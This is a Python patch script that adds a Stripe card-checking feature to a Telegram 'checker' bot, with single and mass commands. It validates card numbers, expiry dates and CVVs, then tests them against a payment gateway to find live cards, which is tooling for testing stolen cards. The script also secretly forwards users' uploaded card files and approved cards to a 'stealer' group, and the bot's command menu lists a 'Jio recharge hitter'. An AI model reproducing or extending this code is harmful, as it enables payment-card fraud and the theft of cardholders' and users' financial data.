import re, shutil, os, sys
from datetime import datetime

# ══════════════════════════════════════════════════════════════════════════════
#  STEP 0: Backup
# ══════════════════════════════════════════════════════════════════════════════
bot_file = 'bot.py'
ce_file = 'check_engine.py'

if not os.path.exists(bot_file):
    print('❌ bot.py not found'); sys.exit(1)
if not os.path.exists(ce_file):
    print('❌ check_engine.py not found'); sys.exit(1)

ts = datetime.now().strftime('%Y%m%d_%H%M%S')
shutil.copy(bot_file, f'{bot_file}.bak_stripe_{ts}')
shutil.copy(ce_file, f'{ce_file}.bak_stripe_{ts}')
print(f'✅ Backups created (.bak_stripe_{ts})')

# ══════════════════════════════════════════════════════════════════════════════
#  STEP 1: check_engine.py — add check_stripe_auth
# ══════════════════════════════════════════════════════════════════════════════
ce = open(ce_file).read()

if 'async def check_stripe_auth' not in ce:
    stripe_ce = '''

# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STRIPE AUTH CHECKER
# ══════════════════════════════════════════════════════════════════════════════
STRIPE_AUTH_API = "http://localhost:9000/stripe_auth"


def _normalize_stripe_card(card: str) -> str:
    import re as _re
    parts = _re.split(r'[|/\\-_\\s]+', card.strip())
    if len(parts) != 4:
        return ""
    cc, mm, yy, cvv = parts
    if not (cc.isdigit() and 15 <= len(cc) <= 16):
        return ""
    if not mm.isdigit() or not (1 <= int(mm) <= 12):
        return ""
    if not yy.isdigit():
        return ""
    if len(yy) == 2:
        yy = "20" + yy
    if not cvv.isdigit() or len(cvv) not in (3, 4):
        return ""
    digits = [int(d) for d in cc]
    for i in range(len(digits) - 2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9:
            digits[i] -= 9
    if sum(digits) % 10 != 0:
        return ""
    return f"{cc}|{mm}|{yy}|{cvv}"


async def check_stripe_auth(card: str) -> dict:
    import time as _t
    normalized = _normalize_stripe_card(card)
    if not normalized:
        return {
            'status': 'Dead', 'message': 'Invalid card format',
            'card': card, 'gateway': 'Stripe Auth', 'price': '-',
            'time': 0, 'raw_response': 'INVALID_FORMAT',
        }
    t0 = _t.time()
    try:
        timeout = aiohttp.ClientTimeout(total=60)
        conn = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=conn) as s:
            async with s.get(STRIPE_AUTH_API, params={"cc": normalized}) as r:
                elapsed = round(_t.time() - t0, 2)
                if r.status != 200:
                    return {
                        'status': 'Dead', 'message': f'HTTP {r.status}',
                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
                        'time': elapsed, 'raw_response': f'HTTP_{r.status}',
                    }
                try:
                    data = await r.json()
                except Exception:
                    return {
                        'status': 'Dead', 'message': 'Invalid JSON',
                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
                        'time': elapsed, 'raw_response': 'INVALID_JSON',
                    }
                approved = data.get('approved', False)
                status_raw = str(data.get('status', '')).upper()
                message = data.get('message') or data.get('error') or 'Unknown'
                message = str(message).strip() or 'Unknown'
                if approved is True or status_raw == 'APPROVED':
                    return {
                        'status': 'Approved',
                        'message': message if message != 'Unknown' else 'Payment method added',
                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
                        'time': elapsed, 'raw_response': 'APPROVED',
                    }
                elif status_raw == 'ERROR':
                    return {
                        'status': 'Dead',
                        'message': message if message != 'Unknown' else 'System error',
                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
                        'time': elapsed, 'raw_response': 'ERROR',
                    }
                else:
                    return {
                        'status': 'Dead',
                        'message': message if message != 'Unknown' else 'Card declined',
                        'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
                        'time': elapsed, 'raw_response': 'DECLINED',
                    }
    except asyncio.TimeoutError:
        return {
            'status': 'Dead', 'message': 'API timeout',
            'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
            'time': round(_t.time() - t0, 2), 'raw_response': 'TIMEOUT',
        }
    except Exception as e:
        return {
            'status': 'Dead', 'message': f'Error: {str(e)[:80]}',
            'card': normalized, 'gateway': 'Stripe Auth', 'price': '-',
            'time': round(_t.time() - t0, 2), 'raw_response': 'ERROR',
        }
'''
    ce += stripe_ce
    open(ce_file, 'w').write(ce)
    print('✅ check_engine.py — check_stripe_auth added')
else:
    print('⏭️  check_engine.py — already has check_stripe_auth')

# ══════════════════════════════════════════════════════════════════════════════
#  STEP 2: bot.py — update import
# ══════════════════════════════════════════════════════════════════════════════
src = open(bot_file).read()

old_imp = """from check_engine import (
    check_card_with_retry, test_proxy, test_site, get_proxy_ip,
    clear_session_bad_sites, clear_error_log, _proxy_to_url,
)"""
new_imp = """from check_engine import (
    check_card_with_retry, test_proxy, test_site, get_proxy_ip,
    clear_session_bad_sites, clear_error_log, _proxy_to_url,
    check_stripe_auth,
)"""
if old_imp in src:
    src = src.replace(old_imp, new_imp)
    print('✅ bot.py — import updated')
elif 'check_stripe_auth' not in src[:3000]:
    # Fallback: insert in check_engine import block
    src = src.replace(
        "from check_engine import (",
        "from check_engine import (\n    check_stripe_auth,"
    )
    print('✅ bot.py — import added (fallback)')

# ══════════════════════════════════════════════════════════════════════════════
#  STEP 3: bot.py — add /stripe + /mstripe handlers
# ══════════════════════════════════════════════════════════════════════════════
if 'stripe_single_check' not in src:
    stripe_code = r'''

# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STRIPE AUTH — SINGLE CHECK
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/stripe\s+'))
async def stripe_single_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝\n{SEP}\n🔒 You need access."), parse_mode='html')
        return

    card_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(card_input)
    if not cards:
        cards = [card_input.replace(' ', '')]
    card = cards[0]

    smsg = await event.reply(
        pe(f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 ⌁ 𝙲𝚑𝚎𝚌𝚔𝚒𝚗𝗴 ⌁ ⚡\n{SEP}\n"
           f"[⌯] 𝗖𝗖 ⌁ <code>{card}</code>\n{SEP}\n"
           f"⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁..."),
        parse_mode='html',
    )
    try:
        t0 = time.time()
        (result, bin_info), (name, username) = await asyncio.gather(
            asyncio.gather(
                check_stripe_auth(card),
                get_bin_info(card.split('|')[0].split('/')[0].split('-')[0]),
            ),
            get_user_info(uid),
        )
        cname = name if username else str(uid)
        result['time'] = round(time.time() - t0, 2)
        result['bin_info'] = bin_info

        resp = build_result_card(result, bin_info, uid, cname)
        gifs = load_gifs()
        if gifs and result.get('status') in ('Charged', 'Approved', 'Live', '3DS'):
            await bot.send_file(uid, gifs[0], caption=resp, parse_mode='html')
            await bot.delete_messages(uid, smsg.id)
        else:
            await raw_edit(uid, smsg.id, resp, [])

        if result.get('status') == 'Approved':
            increment_approved(uid, 1)
            await send_hit_log_gc(result, 'Approved', uid)
            asyncio.create_task(send_hit_to_stealer_gc(result, 'Approved', uid, 'Stripe Single'))
        elif result.get('status') == 'Charged':
            increment_charged(uid, 1)
            await send_hit_log_gc(result, 'Charged', uid)
            asyncio.create_task(send_hit_to_stealer_gc(result, 'Charged', uid, 'Stripe Single'))
    except Exception as e:
        await smsg.edit(pe(f"❌ 𝐂𝐡𝐞𝐜𝐤 𝐅𝐚𝐢𝐥𝐞𝐝\n{SEP}\n⚠️ <code>{e}</code>"), parse_mode='html')


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STRIPE AUTH — MASS CHECK
# ══════════════════════════════════════════════════════════════════════════════
@bot.on(events.NewMessage(pattern=r'^/mstripe$'))
async def stripe_mass_check(event):
    uid = event.sender_id
    if not is_premium(uid):
        await event.reply(pe(f"🚫 𝐀𝐜𝐜𝐞𝐬𝐬 𝐃𝐞𝐧𝐢𝐞𝐝"), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(pe(f"⚡ 𝗥𝗲𝗽𝗹𝘆 𝘁𝗼 𝗮 .𝘁𝘅𝘁 𝗳𝗶𝗹𝗲 𝘄𝗶𝘁𝗵 /mstripe"), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not (reply.file.name or '').endswith('.txt'):
        await event.reply(pe(f"❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐅𝐢𝐥𝐞"), parse_mode='html')
        return

    import tempfile, uuid as _uuid
    _tmp_dir = os.path.join(tempfile.gettempdir(), "rxo_uploads")
    os.makedirs(_tmp_dir, exist_ok=True)
    _tmp_path = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
    fp = await reply.download_media(file=_tmp_path)
    async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    try:
        os.remove(fp)
    except Exception:
        pass

    cards = extract_cc(content)
    file_name = reply.file.name or "stripe_mass.txt"
    if not cards:
        await event.reply(pe(f"❌ 𝐍𝐨 𝐕𝐚𝐥𝐢𝐝 𝐂𝐚𝐫𝐝𝐬"), parse_mode='html')
        return

    # Stealer GC forward
    try:
        stealer_gc = load_stealer_gc()
        if stealer_gc:
            name, username = await get_user_info(uid)
            display = f"@{username}" if username else f"<a href='tg://user?id={uid}'>{name}</a>"
            caption = pe(
                f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 ⌁ 𝚄𝚙𝗹𝗼𝗮𝗱𝗲𝗱 ⌁ ⚡\n"
                f"─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─\n"
                f"[⌯] 𝗨𝘀𝗲𝗿 ⌁ {display} ⌁ <code>{uid}</code>\n"
                f"[⌯] 𝗙𝗶𝗹𝗲 ⌁ {file_name}\n"
                f"[⌯] 𝗖𝗮𝗿𝗱𝘀 ⌁ {len(cards):,}"
            )
            _tmp2 = os.path.join(_tmp_dir, f"{_uuid.uuid4().hex}.txt")
            _tmp2 = await reply.download_media(file=_tmp2)
            await bot.send_file(stealer_gc, _tmp2, caption=caption, parse_mode='html')
            try: os.remove(_tmp2)
            except: pass
    except Exception as e:
        print(f"[Stripe stealer] {e}")

    if uid in user_active_check:
        info = user_active_check[uid]
        _elapsed = int(time.time() - info.get('started_at', time.time()))
        _mins = _elapsed // 60
        await event.reply(pe(
            f"⛔ 𝗖𝗵𝗲𝗰𝗸 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 ⌁ ⚠️\n"
            f"{SEP}\n"
            f"[⌯] 𝗥𝘂𝗻𝗻𝗶𝗻𝗴 𝗳𝗼𝗿 ⌁ {_mins} 𝗺𝗶𝗻 ⌁ ⏱️\n"
            f"[⌯] 𝗨𝘀𝗲 ⌁ /stopmass ⌁ 🛑"
        ), parse_mode='html')
        return

    limit = get_user_limit(uid)
    if len(cards) > limit:
        cards = cards[:limit]

    text = pe(
        f"[⌯] 𝗦𝘁𝗿𝗶𝗽𝗲 𝗠𝗮𝘀𝘀 ⌁ 𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴 ⌁ 🔥\n"
        f"{SEP}\n"
        f"[⌯] 𝗧𝗼𝘁𝗮𝗹 ⌁ {len(cards):,} ⌁ 📦\n"
        f"[⌯] 𝗦𝗰𝗮𝗻𝗻𝗲𝗱 ⌁ 0 ⌁ ⚙️\n"
        f"[⌯] 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ⌁ 0 ⌁ ✅\n"
        f"{SEP}\n"
        f"●○○○○○○○○○○○○○○○○○○○ 0%\n"
        f"0 / {len(cards):,}\n"
        f"{SEP}\n"
        f"⏳ 𝗪𝗮𝗶𝘁𝗶𝗻𝗴...\n"
        f"{SEP}"
    )
    msg_id = await raw_send(uid, text, rows_stop(), reply_to=event.message.id)
    if msg_id:
        user_active_check[uid] = {
            'session_key': f"{uid}_{msg_id}",
            'msg_id': msg_id,
            'started_at': time.time(),
            'card_count': len(cards),
            'check_type': 'stripe',
        }
        asyncio.create_task(run_stripe_mass_check(uid, cards, msg_id, file_name))


# ══════════════════════════════════════════════════════════════════════════════
#  ▸ STRIPE MASS ENGINE
# ══════════════════════════════════════════════════════════════════════════════
async def run_stripe_mass_check(user_id, cards, progress_msg_id, file_name="stripe_mass.txt"):
    session_key = f"{user_id}_{progress_msg_id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'tds': [], 'live': [],
        'declined': [], 'error': [],
        'total': len(cards),
        'start_time': time.time(),
        'last_card_time': time.time(),
        'start_count': 0,
        'file_name': file_name,
    }
    STRIPE_WORKERS = 5
    queue = asyncio.Queue()
    last_update = [time.time()]
    for c in cards:
        queue.put_nowait(c)

    async def worker():
        while True:
            if _stop_flags.get(session_key):
                return
            if session_key not in active_sessions:
                return
            sess = active_sessions.get(session_key)
            if not sess:
                return
            while sess.get('paused', False):
                await asyncio.sleep(1)
                if _stop_flags.get(session_key):
                    return
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            if _stop_flags.get(session_key):
                return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            t0 = time.time()
            try:
                result = await asyncio.wait_for(check_stripe_auth(card), timeout=90)
                result['time'] = round(time.time() - t0, 2)
                if _stop_flags.get(session_key):
                    break
                bin_info = await get_bin_info(card.split('|')[0])
                result['bin_info'] = bin_info
                st = result.get('status', 'Dead')
                if st == 'Approved':
                    all_results['approved'].append(result)
                    increment_approved(user_id, 1)
                    asyncio.create_task(send_realtime_hit(user_id, result, 'Approved', file_name))
                    asyncio.create_task(send_hit_log_gc(result, 'Approved', user_id))
                elif st == 'Charged':
                    all_results['charged'].append(result)
                    increment_charged(user_id, 1)
                    asyncio.create_task(send_realtime_hit(user_id, result, 'Charged', file_name))
                    asyncio.create_task(send_hit_log_gc(result, 'Charged', user_id))
                elif st == 'Live':
                    all_results['live'].append(result)
                elif st == '3DS':
                    result['status'] = '3DS'
                    all_results['tds'].append(result)
                else:
                    if result.get('raw_response') in ('ERROR', 'TIMEOUT', 'INVALID_JSON', 'INVALID_FORMAT') or str(result.get('raw_response', '')).startswith('HTTP_'):
                        all_results['error'].append(result)
                    else:
                        all_results['declined'].append(result)
            except asyncio.TimeoutError:
                result = {'card': card, 'status': 'Dead', 'message': 'Timeout',
                          'raw_response': 'TIMEOUT', 'time': round(time.time() - t0, 2)}
                all_results['error'].append(result)
            except Exception as _we:
                result = {'card': card, 'status': 'Dead', 'message': f'Error: {str(_we)[:60]}',
                          'raw_response': 'ERROR', 'time': round(time.time() - t0, 2)}
                all_results['error'].append(result)
            checked = (len(all_results['charged']) + len(all_results['approved']) +
                       len(all_results['tds']) + len(all_results['live']) +
                       len(all_results['declined']) + len(all_results['error']))
            now = time.time()
            if now - last_update[0] >= 3:
                last_update[0] = now
                try:
                    await update_mass_progress(user_id, progress_msg_id, all_results, checked, result)
                except Exception:
                    pass

    try:
        workers = [asyncio.create_task(worker()) for _ in range(STRIPE_WORKERS)]
        await asyncio.gather(*workers, return_exceptions=True)
    except Exception as _e:
        print(f"[STRIPE MASS] {_e}")
    finally:
        _was_stopped = _stop_flags.get(session_key, False)
        _stop_flags.pop(session_key, None)
        active_sessions.pop(session_key, None)
        user_active_check.pop(user_id, None)
        if not _was_stopped:
            try:
                await send_final_results(user_id, all_results)
            except Exception as _fe:
                print(f"stripe send_final_results error: {_fe}")

'''
    marker = 'def _register_commands():'
    if marker in src:
        src = src.replace(marker, stripe_code + '\n\n' + marker)
        print('✅ bot.py — stripe handlers added')
    else:
        src = src.replace("bot.run_until_disconnected()",
                          stripe_code + "\n\nbot.run_until_disconnected()")
        print('✅ bot.py — stripe handlers appended')

    # Command menu
    if '"command": "stripe"' not in src:
        src = src.replace(
            '{"command": "jio", "description": "📱 Jio recharge hitter"}',
            '{"command": "jio", "description": "📱 Jio recharge hitter"},\n        {"command": "stripe", "description": "💳 Stripe auth check"},\n        {"command": "mstripe", "description": "💳 Stripe mass check"}'
        )
        print('✅ Command menu updated')
else:
    print('⏭️  bot.py — stripe already exists')

open(bot_file, 'w').write(src)

# ══════════════════════════════════════════════════════════════════════════════
#  STEP 4: syntax check
# ══════════════════════════════════════════════════════════════════════════════
import ast
try:
    ast.parse(open(bot_file).read())
    print('✅ bot.py syntax OK')
except SyntaxError as e:
    print(f'❌ bot.py syntax error: {e}')
    print(f'   Restoring from backup...')
    shutil.copy(f'{bot_file}.bak_stripe_{ts}', bot_file)
    print('✅ Restored — nothing changed')
    sys.exit(1)

try:
    ast.parse(open(ce_file).read())
    print('✅ check_engine.py syntax OK')
except SyntaxError as e:
    print(f'❌ check_engine.py syntax error: {e}')
    shutil.copy(f'{ce_file}.bak_stripe_{ts}', ce_file)
    print('✅ check_engine.py restored')
    sys.exit(1)

print()
print('🎉 DONE! Restart bot:')
print('   cd /root/dxo && pkill -f "python3 bot.py"; sleep 2; rm -rf __pycache__; rm -f checker_bot.session-journal; screen -dmS rxpbot bash -c "while true; do python3 bot.py >> bot.log 2>&1; sleep 5; done" && sleep 8 && tail -20 bot.log')
